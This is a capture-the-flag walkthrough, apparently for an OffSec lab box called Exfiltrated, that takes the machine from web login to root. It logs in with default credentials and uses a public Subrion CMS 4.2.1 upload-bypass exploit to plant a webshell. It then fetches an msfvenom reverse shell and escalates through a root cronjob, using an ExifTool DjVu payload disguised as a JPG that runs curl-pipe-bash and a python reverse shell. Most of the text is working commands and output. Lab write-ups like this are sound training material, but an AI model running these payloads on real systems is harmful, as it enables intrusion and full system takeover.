# Exploitation Guide for Exfiltrated

## Summary

In this walkthrough, we will exploit the target via an authenticated file upload bypass vulnerability in _Subrion CMS_ that leads to remote code execution. We'll then exploit a root cronjob via a script running **exiftool** every minute.

## Enumeration

### Nmap

We'll begin with an `nmap` scan.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap 192.168.120.227
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-27 17:42 EDT
Nmap scan report for 192.168.120.227
Host is up (0.042s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

The results indicate that only HTTP and SSH services are running. Let's scan the HTTP service in more detail.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p 80 192.168.120.227
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-27 17:51 EDT
Nmap scan report for 192.168.120.227
Host is up (0.039s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 7 disallowed entries 
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/ 
|_/updates/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
...
```

We see the scanner being redirected to a domain name. To proceed, we'll need to add `exfiltrated.offsec` to our local **/etc/hosts**.

```
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
...
192.168.120.227 exfiltrated.offsec
...
```

### HTTP Enumeration

Visiting the web application on port 80 (http://exfiltrated.offsec/), we are presented with a _Subrion CMS_ landing page.

```
┌──(kali㉿kali)-[~]
└─$ curl http://exfiltrated.offsec/ -s | html2text | tail
*** For designers ***
Simple templating engine and styles allows you to create any template you wish
with just a few lines of code.
    * About_Us
    * Privacy_Policy
    * Terms_of_Use
    * Help
    * Blog
© 2021 Powered by Subrion_CMS
```

On this page, we find two links leading to different login controls. The _Log in_ link at the top of the page leads to **/login**.

```
┌──(kali㉿kali)-[~]
└─$ curl http://exfiltrated.offsec/ -s | grep login    
            <li><a href="http://exfiltrated.offsec/login/">Log in</a></li>
            
┌──(kali㉿kali)-[~]
└─$
```

The _GO TO ADMIN DASHBOARD_ link in the middle of the page leads to **/panel**.

```
┌──(kali㉿kali)-[~]
└─$ curl http://exfiltrated.offsec/ -s | grep dashboard 
    <a class="btn btn-primary text-uppercase" href="http://exfiltrated.offsec/panel/">Go to admin dashboard</a>
...

┌──(kali㉿kali)-[~]
└─$
```

Following the second link (http://exfiltrated.offsec/panel/), we find that the version of the application is 4.2.1.

```
┌──(kali㉿kali)-[~]
└─$ curl http://exfiltrated.offsec/panel/ -s | html2text | tail
[********************]
⁰ Remember me
[Login] Forgot_your_password?
E-mail is incorrect.
Restore Password
[email               ]
[Go] [Cancel]
Powered by Subrion_CMS_v4.2.1
Copyright © 2008-2021 Intelliants_LLC
â_Back_to_homepage
```

## Exploitation

### Guessing Admin Credentials

After trying some common and well-known default credential pairs to log in, we succeed with `admin:admin`. After authenticating, we are presented with an administrative dashboard. In fact, these credentials also work for the first login control at http://exfiltrated.offsec/login/, where we can find a link that leads to the same dashboard.

### Subrion CMS 4.2.1 - File Upload Bypass and RCE

Public exploit search reveals a [Remote Code Execution](https://www.exploit-db.com/exploits/49876) vulnerability in this version of the application. Let's update `searchsploit` and then copy the exploit to our working directory.

```
┌──(kali㉿kali)-[~]
└─$ searchsploit -u
...

┌──(kali㉿kali)-[~]
└─$ searchsploit -m 49876
  Exploit: Subrion CMS 4.2.1 - File Upload Bypass to RCE (Authenticated)
      URL: https://www.exploit-db.com/exploits/49876
     Path: /usr/share/exploitdb/exploits/php/webapps/49876.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators

Copied to: /home/kali/49876.py
```

This exploit requires us having valid credentials for the application. Luckily, we were able to guess them and can give this exploit a try.

```
┌──(kali㉿kali)-[~]
└─$ python3 49876.py -u http://exfiltrated.offsec/panel/ --user admin --pass admin
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://exfiltrated.offsec/panel/
[+] Success!
[+] Got CSRF token: ab3nXsOBXekpoyirF4ndK4aN7iMq3HKWqvn4WHeC
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: wbwaycgwzypbqtv

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/wbwaycgwzypbqtv.phar 

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ 
```

Nice, we have remote code execution.

### Reverse Shell

The exploit gave us a simple web shell on the target. Let's obtain a more stable shell. First, we will generate our payload.

```
┌──(kali㉿kali)-[~]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.118.11 LPORT=4444 -f elf -o shell
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: shell
```

Next, let's start up our python web server.

```
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
...
```

In a separate console tab, we'll also start a Netcat listener.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
...
```

Finally, let's upload our payload, give it executable permissions, and then execute it to trigger our shell.

```
$ wget http://192.168.118.11/shell -O /tmp/shell

$ chmod 777 /tmp/shell

$ /tmp/shell
```

Our listener should catch the reverse shell.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.118.11] from (UNKNOWN) [192.168.120.227] 46284
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@exfiltrated:/var/www/html/subrion/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@exfiltrated:/var/www/html/subrion/uploads$ 
```

## Escalation

### Cronjob Enumeration

After further enumeration, we find an entry in the **/etc/crontab** file, executing **/opt/image-exif.sh** as root every minute.

```
www-data@exfiltrated:/var/www/html/subrion/uploads$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
...
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh
#
```

Let's take a closer look at this script file.

```
www-data@exfiltrated:/var/www/html/subrion/uploads$ cat /opt/image-exif.sh
cat /opt/image-exif.sh
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```

The script is executing **/usr/bin/exiftool** on JPG images located at **/var/www/html/subrion/uploads** and stores the output in a logfile.

```
www-data@exfiltrated:/var/www/html/subrion/uploads$ which exiftool
which exiftool
/usr/bin/exiftool
```

### ExifTool Arbitrary Code Execution

Public search reveals the following [exploit-db](https://www.exploit-db.com/docs/49881) document on CVE-2021-22204. The document details an arbitrary code execution vulnerability in the _DjVu_ file format in _ExifTool_ versions 7.44 and up. Although we cannot easily determine the version of the tool running on this target, we'll give this exploit a try.

This exploit uses **djvumake**, which we can install with the `djvulibre-bin` package.

```
┌──(kali㉿kali)-[~]
└─$ sudo apt-get update && sudo apt-get install -y djvulibre-bin
...

┌──(kali㉿kali)-[~]
└─$ which djvumake
/usr/bin/djvumake
```

We'll create a couple of files for this exploit: **shell.sh** with a python reverse shell one-liner and **exploit** with a `curl` call to our payload piped directly into `bash` for execution.

```
┌──(kali㉿kali)-[~]
└─$ cat shell.sh 
#!/bin/bash

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.118.11",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

┌──(kali㉿kali)-[~]
└─$ cat exploit 
(metadata "\c${system ('curl http://192.168.118.11/shell.sh | bash')};")
```

Next, we'll run **djvumake** and then rename the resulting file as JPG.

```
┌──(kali㉿kali)-[~]
└─$ djvumake exploit.djvu INFO=0,0 BGjp=/dev/null ANTa=exploit

┌──(kali㉿kali)-[~]
└─$ mv exploit.djvu exploit.jpg

┌──(kali㉿kali)-[~]
└─$ file exploit.jpg
exploit.jpg: DjVu image or single page document

┌──(kali㉿kali)-[~]
└─$ 
```

We'll restart a Netcat listener.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
...
```

With our python web server still running, let's transfer the malicious **exploit.jpg** to **/var/www/html/subrion/uploads** on the target.

```
www-data@exfiltrated:/var/www/html/subrion/uploads$ wget http://192.168.118.11/exploit.jpg -O /var/www/html/subrion/uploads/exploit.jpg 
<it.jpg -O /var/www/html/subrion/uploads/exploit.jpg
--2021-08-27 23:21:00--  http://192.168.118.11/exploit.jpg
Connecting to 192.168.118.11:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 123 [image/jpeg]
Saving to: ‘/var/www/html/subrion/uploads/exploit.jpg’

/var/www/html/subri 100%[===================>]     123  --.-KB/s    in 0s      

2021-08-27 23:21:00 (21.5 MB/s) - ‘/var/www/html/subrion/uploads/exploit.jpg’ saved [123/123]

www-data@exfiltrated:/var/www/html/subrion/uploads$ 
```

Finally, we'll wait about a minute for the cronjob to execute and trigger our shell.

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.118.11] from (UNKNOWN) [192.168.120.227] 46296
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

We have root!
